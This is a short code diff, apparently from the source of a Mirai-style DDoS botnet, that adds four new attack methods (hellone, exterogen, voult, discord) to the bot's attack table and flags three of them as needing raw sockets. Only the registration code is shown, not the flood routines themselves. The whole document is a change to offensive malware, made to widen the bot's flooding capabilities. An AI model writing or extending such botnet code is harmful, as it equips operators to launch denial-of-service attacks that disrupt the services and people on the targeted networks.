@@ -27,6 +27,7 @@ static BOOL attack_vector_needs_raw(ATTACK_VECTOR v)
         case ATK_VEC_GREIP: case ATK_VEC_ORBITV3: case ATK_VEC_SOCKET:
         case ATK_VEC_NFOLAG: case ATK_VEC_MPTCPGRE:
         case ATK_VEC_GREETH: case ATK_VEC_GRESTACK: case ATK_VEC_UDPX:
+        case ATK_VEC_HELLONE: case ATK_VEC_EXTEROGEN: case ATK_VEC_VOULT:
             return TRUE;
         default: return FALSE;
     }
@@ -68,6 +69,10 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_CHARGEN, (ATTACK_FUNC)attack_method_chargen);
     add_attack(ATK_VEC_MEMCACHED, (ATTACK_FUNC)attack_method_memcached);
     add_attack(ATK_VEC_UDPX, (ATTACK_FUNC)attack_method_udpx);
+    add_attack(ATK_VEC_HELLONE, (ATTACK_FUNC)attack_method_hellone);
+    add_attack(ATK_VEC_EXTEROGEN, (ATTACK_FUNC)attack_method_exterogen);
+    add_attack(ATK_VEC_VOULT, (ATTACK_FUNC)attack_method_voult);
+    add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_method_discord);
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
     return TRUE;
 }
